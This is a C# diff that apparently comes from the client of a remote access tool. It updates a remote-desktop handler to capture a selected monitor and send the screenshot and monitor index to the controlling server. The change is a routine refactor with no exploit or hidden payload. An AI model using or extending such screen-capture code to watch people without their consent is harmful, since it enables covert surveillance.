@@ -223,10 +223,10 @@ namespace xClient.Core.Commands
 
 		public static void HandleRemoteDesktop(Packets.ServerPackets.Desktop command, Client client)
 		{
-			if (StreamCodec == null || StreamCodec.ImageQuality != command.Quality)
-				StreamCodec = new UnsafeStreamCodec(command.Quality);
+			if (StreamCodec == null || StreamCodec.ImageQuality != command.Quality || StreamCodec.Monitor != command.Monitor)
+				StreamCodec = new UnsafeStreamCodec(command.Quality, command.Monitor);
 
-			LastDesktopScreenshot = Helper.Helper.GetDesktop(command.Number);
+			LastDesktopScreenshot = Helper.Helper.GetDesktop(command.Monitor);
 			BitmapData bmpdata = LastDesktopScreenshot.LockBits(
 				new Rectangle(0, 0, LastDesktopScreenshot.Width, LastDesktopScreenshot.Height), ImageLockMode.ReadWrite,
 				LastDesktopScreenshot.PixelFormat);
@@ -237,7 +237,7 @@ namespace xClient.Core.Commands
 					new Rectangle(0, 0, LastDesktopScreenshot.Width, LastDesktopScreenshot.Height),
 					new Size(LastDesktopScreenshot.Width, LastDesktopScreenshot.Height), LastDesktopScreenshot.PixelFormat,
 					stream);
-				new Packets.ClientPackets.DesktopResponse(stream.ToArray(), StreamCodec.ImageQuality).Execute(client);
+				new Packets.ClientPackets.DesktopResponse(stream.ToArray(), StreamCodec.ImageQuality, StreamCodec.Monitor).Execute(client);
 			}
 
 			LastDesktopScreenshot.UnlockBits(bmpdata);
